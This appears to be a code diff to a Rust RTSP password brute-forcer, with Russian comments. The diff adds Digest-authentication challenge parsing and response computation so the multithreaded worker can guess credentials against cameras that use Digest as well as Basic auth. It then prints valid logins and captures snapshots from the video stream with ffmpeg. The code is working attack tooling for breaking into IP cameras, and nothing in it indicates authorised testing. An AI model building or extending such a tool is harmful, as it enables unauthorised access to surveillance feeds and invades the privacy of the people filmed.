@@ -7,8 +7,7 @@ use std::time::Duration;
 use base64::prelude::*;
 use std::fs;
 use std::process::Command;
-
-
+use md5;
 
 // Конфигурация
 #[derive(Clone)]
@@ -29,8 +28,137 @@ pub struct AuthResult {
     pub response: String,
 }
 
+#[derive(Debug, Clone)]
+struct DigestChallenge {
+    realm: String,
+    nonce: String,
+    qop: Option<String>,
+    algorithm: String,
+    uri: String, // мы проставим её в brute_force_target
+}
+
+fn create_digest_packet_with_challenge(
+    username: &str,
+    password: &str,
+    chal: &DigestChallenge,
+) -> String {
+    let method = "DESCRIBE";
+    let uri = &chal.uri;
+
+    // Поддерживаем только MD5
+    if chal.algorithm.to_uppercase() != "MD5" {
+        eprintln!("[!] Unsupported Digest algorithm: {}", chal.algorithm);
+    }
+
+    // HA1 = MD5(username:realm:password)
+    let ha1_input = format!("{}:{}:{}", username, chal.realm, password);
+    let ha1 = format!("{:x}", md5::compute(ha1_input));
+
+    // HA2 = MD5(method:uri)
+    let ha2_input = format!("{}:{}", method, uri);
+    let ha2 = format!("{:x}", md5::compute(ha2_input));
+
+    let (response, auth_header) = if let Some(qop) = &chal.qop {
+        // RFC: qop=auth → MD5(HA1:nonce:nc:cnonce:qop:HA2)
+        let nc = "00000001";
+        let cnonce = "deadbeef"; // можно сделать рандомным
+
+        let resp_input = format!("{}:{}:{}:{}:{}:{}", ha1, chal.nonce, nc, cnonce, qop, ha2);
+        let resp = format!("{:x}", md5::compute(resp_input));
+
+        let header = format!(
+            "Digest username=\"{}\", realm=\"{}\", nonce=\"{}\", uri=\"{}\", response=\"{}\", algorithm={}, qop={}, nc={}, cnonce=\"{}\"",
+            username,
+            chal.realm,
+            chal.nonce,
+            uri,
+            resp,
+            chal.algorithm,
+            qop,
+            nc,
+            cnonce
+        );
+        (resp, header)
+    } else {
+        // Старый стиль без qop
+        // response=MD5(HA1:nonce:HA2)
+        let resp_input = format!("{}:{}:{}", ha1, chal.nonce, ha2);
+        let resp = format!("{:x}", md5::compute(resp_input));
+
+        let header = format!(
+            "Digest username=\"{}\", realm=\"{}\", nonce=\"{}\", uri=\"{}\", response=\"{}\", algorithm={}",
+            username,
+            chal.realm,
+            chal.nonce,
+            uri,
+            resp,
+            chal.algorithm,
+        );
+        (resp, header)
+    };
+
+    let _ = response; // сейчас не используем отдельно
+
+    format!(
+        "DESCRIBE {} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {}\r\n\r\n",
+        uri, auth_header
+    )
+}
+
+fn parse_digest_challenge(resp: &str) -> Option<DigestChallenge> {
+    // Ищем строку WWW-Authenticate с "Digest"
+    let mut header_line = None;
+    for line in resp.lines() {
+        let line_trim = line.trim();
+        if line_trim.to_lowercase().starts_with("www-authenticate:")
+            && line_trim.contains("Digest")
+        {
+            header_line = Some(line_trim.to_string());
+            break;
+        }
+    }
+
+    let header_line = header_line?;
+
+    // Обрезаем "WWW-Authenticate:" и "Digest"
+    let lower = header_line.to_lowercase();
+    let idx = lower.find("digest")?;
+    let params_part = &header_line[idx + "digest".len()..].trim();
+
+    let mut realm: Option<String> = None;
+    let mut nonce: Option<String> = None;
+    let mut qop: Option<String> = None;
+    let mut algorithm: Option<String> = None;
+
+    for part in params_part.split(',') {
+        let part = part.trim();
+        let mut kv = part.splitn(2, '=');
+        let key = kv.next()?.trim().trim_matches('"');
+        let val_raw = kv.next().unwrap_or("").trim();
+
+        let val = val_raw.trim_matches('"');
+
+        match key.to_lowercase().as_str() {
+            "realm" => realm = Some(val.to_string()),
+            "nonce" => nonce = Some(val.to_string()),
+            "qop" => qop = Some(val.to_string()),
+            "algorithm" => algorithm = Some(val.to_string()),
+            _ => {}
+        }
+    }
+
+    Some(DigestChallenge {
+        realm: realm.unwrap_or_default(),
+        nonce: nonce.unwrap_or_default(),
+        qop,
+        algorithm: algorithm.unwrap_or_else(|| "MD5".to_string()),
+        uri: String::new(), // заполним позже
+    })
+}
+
+
 // Тип для функции создания пакетов
-type PacketCreator = fn(&str, &str, &str) -> String;
+type PacketCreator = Arc<dyn Fn(&str, &str, &str) -> String + Send + Sync>;
 
 // Создание тестового пакета
 fn create_test_packet(ip: &str) -> String {
@@ -135,15 +263,12 @@ fn auth_worker(
         let mut queue = work_queue.lock().unwrap();
         queue.pop_front()
     } {
-        // Пропускаем пустые учетные данные
         if username.is_empty() || password.is_empty() {
             continue;
         }
 
-        // Создаем новое соединение для каждой попытки
         match TcpStream::connect(format!("{}:{}", config.target_ip, config.target_port)) {
             Ok(mut stream) => {
-                // Устанавливаем таймауты
                 if let Err(e) = stream.set_read_timeout(Some(Duration::from_secs(8))) {
                     eprintln!("[Worker {}] Set read timeout error: {}", worker_id, e);
                     continue;
@@ -154,19 +279,21 @@ fn auth_worker(
                     continue;
                 }
 
-                let packet = packet_creator(&config.target_ip, &username, &password);
+                // 🔥 Вот здесь теперь вызываем Fn
+                let packet = (packet_creator)(&config.target_ip, &username, &password);
                 
-                // Отправляем пакет
                 if let Err(e) = stream.write_all(packet.as_bytes()) {
                     eprintln!("[Worker {}] Write error: {}", worker_id, e);
                     continue;
                 }
 
-                // Читаем ответ с улучшенной обработкой
                 match read_response(&mut stream) {
                     Ok(response) => {
                         if is_authorized(&response) {
-                            println!("[Worker {}] Found valid credentials: {}:{}", worker_id, username, password);
+                            println!(
+                                "[Worker {}] Found valid credentials: {}:{}",
+                                worker_id, username, password
+                            );
                             
                             let result = AuthResult {
                                 username: username.clone(),
@@ -189,7 +316,6 @@ fn auth_worker(
             }
         }
         
-        // Небольшая пауза чтобы не перегружать целевой сервер
         thread::sleep(Duration::from_millis(50));
     }
 }
@@ -244,9 +370,35 @@ pub fn brute_force_target(
                     if is_unauthorized(&response) {
                         if use_basic_auth(&response) {
                             println!("[*] Basic authentication detected, starting brute force...");
-                            Some(create_basic_packet as PacketCreator)
+                            let pc: PacketCreator = Arc::new(|ip, user, pass| {
+                                create_basic_packet(ip, user, pass)
+                            });
+                            Some(pc)
+                        } else if response.to_lowercase().contains("www-authenticate: digest") {
+                            println!("[*] Digest authentication detected, starting brute force...");
+
+                            // Парсим challenge
+                            if let Some(mut chal) = parse_digest_challenge(&response) {
+                                // URI должен совпадать с Request-URI, который ты используешь в DESCRIBE.
+                                // У тебя тестовый пакет: "DESCRIBE rtsp://{ip} RTSP/1.0"
+                                // Значит URI будет:
+                                chal.uri = format!("rtsp://{}", config.target_ip);
+
+                                let chal_arc = Arc::new(chal);
+                                let pc: PacketCreator = {
+                                    let chal_clone = Arc::clone(&chal_arc);
+                                    Arc::new(move |_ip, user, pass| {
+                                        create_digest_packet_with_challenge(user, pass, &chal_clone)
+                                    })
+                                };
+
+                                Some(pc)
+                            } else {
+                                println!("[-] Failed to parse Digest challenge");
+                                None
+                            }
                         } else {
-                            println!("[-] Unsupported authentication method (only Basic auth supported)");
+                            println!("[-] Unsupported authentication method (only Basic/Digest supported)");
                             None
                         }
                     } else if is_authorized(&response) {
@@ -324,17 +476,18 @@ fn start_brute_force(
         let config_clone = config.clone();
         let work_queue_clone = Arc::clone(&work_queue);
         let results_clone = Arc::clone(&results);
-        
+        let packet_creator_clone = Arc::clone(&packet_creator);
+
         let handle = thread::spawn(move || {
             auth_worker(
                 config_clone,
                 work_queue_clone,
                 results_clone,
-                packet_creator,
+                packet_creator_clone,
                 i,
             );
         });
-        
+
         handles.push(handle);
     }
     
@@ -496,14 +649,16 @@ pub fn capture_snapshot_rtsp(
 
     // ffmpeg -rtsp_transport tcp -y -i <url> -frames:v 1 <file>
     let status = Command::new("ffmpeg")
-        .arg("-y") 
-        .arg("-i")
-        .arg(&url)
-        .arg("-ss")
-        .arg("1")
-        .arg("-vframes")
-        .arg("1")
+        .arg("-y")
+        .arg("-rtsp_transport").arg("tcp")
+        .arg("-analyzeduration").arg("5M")
+        .arg("-probesize").arg("5M")
+        .arg("-i").arg(&url)
+        .arg("-ss").arg("1")
+        .arg("-vframes").arg("1")
+        .arg("-q:v").arg("2")
         .arg(&filename)
+        .arg("-loglevel").arg("quiet")
         .status()?;
 
     if !status.success() {
